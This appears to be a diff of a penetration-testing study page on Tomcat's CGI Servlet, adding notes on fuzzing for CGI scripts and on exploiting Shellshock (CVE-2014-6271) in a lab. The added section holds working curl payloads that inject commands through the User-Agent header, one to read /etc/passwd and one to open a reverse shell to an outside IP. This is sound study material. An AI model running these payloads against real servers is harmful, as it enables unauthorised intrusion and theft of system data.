@@ -1,6 +1,11 @@
 # Tomcat CGI
 
-The CGI Servlet in Apache Tomcat helps web servers talk to programs outside the Tomcat environment. These external programs are usually CGI scripts in languages like Perl, Python, or Bash. The CGI Servlet takes requests from web browsers and sends them to these scripts for processing. Essentially, it allows web servers, like Apache2, to run external applications following the CGI standard and acts as a link between web servers and external data sources, like databases.
+The CGI Servlet in Apache Tomcat helps web servers talk to programs outside the Tomcat environment. These external programs are usually CGI scripts in languages like Perl, Python, or Bash. The CGI Servlet takes requests from web browsers and sends them to these scripts for processing. Essentially, it allows web servers, like Apache2, to run external applications following the CGI standard and acts as a link between web servers and external data sources, like databases. It is typically used to render dynamic content onto web pages and acts as middleware between the web servers, external databases and the front end of the web application. CGI scripts are stored in /CGI-bin or /cgi
+
+\
+
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -115,6 +120,8 @@ we can use FFUF on the /cgi directory to locate sgi scripts we can try to exploi
 
 ```shell-session
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+
+gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 ```
 
 Its also important to fuzz for other extensions:
@@ -122,3 +129,45 @@ Its also important to fuzz for other extensions:
 ```shell-session
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
 ```
+
+### Shellshock CVE-2014-6271
+
+> Security flaw in the Bash shell that can be used to inject commands via environment variables. This is a 25 year old bug that is still found in the wild frequently. the older bash version saves environment variables incorrectly resulting in the possible execution of operating system commands that are included after a function stored inside an environment variable.&#x20;
+
+```
+env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+```
+
+#### Locate CGI scripts:
+
+```shell-session
+gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+
+Curl the script, see if it returns 200 or additonal data&#x20;
+
+```shell-session
+curl -i http://10.129.204.231/cgi-bin/access.cgi
+
+HTTP/1.1 200 OK
+Date: Thu, 23 Mar 2023 13:28:55 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html
+```
+
+Validating vulnerability:&#x20;
+
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+Exploiting for a reverse shell:
+
+```
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+#### Mitigation:
+
+{% embed url="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability" %}
